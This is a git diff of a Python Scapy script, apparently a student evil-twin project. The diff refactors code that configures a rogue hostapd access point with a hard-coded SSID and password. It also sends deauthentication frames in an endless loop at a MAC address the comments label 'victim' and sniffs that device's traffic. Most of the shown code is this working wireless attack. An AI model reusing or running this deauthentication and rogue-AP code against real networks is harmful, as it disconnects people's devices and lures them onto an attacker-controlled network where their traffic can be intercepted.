@@ -10,10 +10,6 @@ from user import user
 import time
 
 
-# global variable
-flag_user_enters = True
-
-
 #function that get input but will keap run if it wont get input in 1 sec
 def get_input(prompt, timeout):
     print(prompt)
@@ -136,7 +132,7 @@ def handle_packets_own_network(pkt, chosen_user, wifi_mac_address):
             check_addr1 = pkt.addr1
             check_addr2 = pkt.addr2
             if (check_addr1 == chosen_user and check_addr2 == wifi_mac_address) or \
-                    (check_addr1 == wifi_mac_address and check_addr2 == chosen):
+                    (check_addr1 == wifi_mac_address and check_addr2 == chosen_user):
                 flag_user_enters = False
 
 
@@ -149,17 +145,17 @@ def print_packets(pkt):
             check_addr1 = pkt.addr1
             check_addr2 = pkt.addr2
             if (check_addr1 == chosen_user and check_addr2 == wifi_mac_address) or \
-                    (check_addr1 == wifi_mac_address and check_addr2 == chosen):
+                    (check_addr1 == wifi_mac_address and check_addr2 == chosen_user):
                 print(pkt)
 
 
-def setup_ap(iface_wifi, wifi_channel, ssid, password):
-    # set up the interface to monitor mode
+def set_adapter_to_monitor(iface_wifi):
     os.system(f"sudo ifconfig {iface_wifi} down")
     os.system(f"sudo iwconfig {iface_wifi} mode monitor")
     os.system(f"sudo ifconfig {iface_wifi} up")
 
 
+def start_ap(iface_wifi):
     # Stop any existing DHCP servers
     subprocess.call(['sudo', 'service', 'isc-dhcp-server', 'stop'])
 
@@ -183,25 +179,35 @@ def setup_ap(iface_wifi, wifi_channel, ssid, password):
     # Wait for the access point to start
     time.sleep(5)
 
-    # config file for the new wifi, with the ssid, password, channel and more
+def stop_ap(iface):
+    # Stop the access point
+    subprocess.call(['sudo', 'service', 'isc-dhcp-server', 'stop'])
+    subprocess.call(['sudo', 'hostapd', '-B', '/etc/hostapd/hostapd.conf', '-i', iface, '-K'])
+    subprocess.call(['sudo', 'ifconfig', iface, 'down'])
+
+def create_ap_config(ssid, password, iface_wifi):
     config_file = f"""interface={iface_wifi}
-    ssid={ssid}
-    wpa=2
-    wpa_passphrase={password}
-    wpa_key_mgmt=WPA-PSK
-    wpa_pairwise=TKIP
-    rsn_pairwise=CCMP
-    driver=nl80211
-    channel={wifi_channel}"""
+ssid={ssid}
+wpa=2
+wpa_passphrase={password}
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP
+rsn_pairwise=CCMP
+driver=nl80211
+channel=6"""
     with open("/etc/hostapd/hostapd.conf", "w") as f:
         f.write(config_file)
 
 
 
 
-# def run_script(script_name):
-#
+interface = "wlxc83a35c2e0a2"
+ssid = "eylon&michael"
+password = "E1y2!3o4n5"
 
+set_adapter_to_monitor(interface)
+start_ap(interface)
+create_ap_config(ssid, password, interface)
 
 
 
@@ -280,20 +286,14 @@ while True:
 
 curr_user = users_list[chosen_user]
 wifi_mac_address = "c8:3a:35:c2:e0:a2"
-script_name = 'ap_setup.py'
 
-# args for the setup function
-iface_wifi = "wlxc83a35c2e0a2"
-wifi_channel = 6
-# the ssid and the password of the new wifi
-ssid = "eylon&michael"
-password = "E1y2!3o4n5"
+
 
 
 
 # run the ap_setup in another thread
-thread = threading.Thread(target=setup_ap, args=(iface_wifi, wifi_channel, ssid, password))
-thread.start()
+# thread = threading.Thread(target=setup_ap, args=(iface_wifi, wifi_channel, ssid, password))
+# thread.start()
 
 
 # 28:cd:c4:9b:87:f5  victim
@@ -301,29 +301,30 @@ thread.start()
 # 34:49:5b:17:a9:b4 ariel wifi
 # 24:18:1d:f7:87:c9 galaxy victim
 
-while flag_user_enters:
-    # change the channel to the network che
-    os.system("iwconfig %s channel %d" % (iface, chosen_network_interface.CH))
-    # Create the Deauthentication frame
-    deauth = RadioTap() / Dot11(addr1=chosen_user, addr2=chosen_interface, addr3=chosen_interface) / Dot11Deauth()
-    # Send the frame
 
-    sendp(deauth, iface=iface, count=7)
+# change the channel to the network che
+os.system("iwconfig %s channel %d" % (iface, chosen_network_interface.CH))
+# Create the Deauthentication frame
+deauth = RadioTap() / Dot11(addr1=chosen_user, addr2=chosen_interface, addr3=chosen_interface) / Dot11Deauth()
+# Send the frame
 
-    time.sleep(1)
+while True:
+    sendp(deauth, iface=iface, count=30)
 
-    # desplay the network that was choosen
-    print(f"waiting until the victim logs in :\n{chosen_network_interface}")
-    print("-----------------------------------------------------------------------------------------------------------------------------")
-    print(f"the victim is  : {chosen_user}")
-    print(f"the interface is: {chosen_interface}")
-    print(f"the channel is: {chosen_network_interface.CH}")
-    print("-----------------------------------------------------------------------------------------------------------------------------")
-    # change the channel to the network che
-    # os.system("iwconfig %s channel %d" % (iface, wifi_channel))
-    # # start to sniff packets for 3 sec
-    # sniff(iface=iface, prn=lambda pkt: handle_packets_own_network(pkt, chosen_user, wifi_mac_address),
-    #       timeout=3)
+time.sleep(1)
+
+# desplay the network that was choosen
+print(f"waiting until the victim logs in :\n{chosen_network_interface}")
+print("-----------------------------------------------------------------------------------------------------------------------------")
+print(f"the victim is  : {chosen_user}")
+print(f"the interface is: {chosen_interface}")
+print(f"the channel is: {chosen_network_interface.CH}")
+print("-----------------------------------------------------------------------------------------------------------------------------")
+# change the channel to the network che
+# os.system("iwconfig %s channel %d" % (iface, wifi_channel))
+# # start to sniff packets for 3 sec
+# sniff(iface=iface, prn=lambda pkt: handle_packets_own_network(pkt, chosen_user, wifi_mac_address),
+#       timeout=3)
 
 sniff(iface=iface, prn=lambda pkt: print_packets(pkt))
 
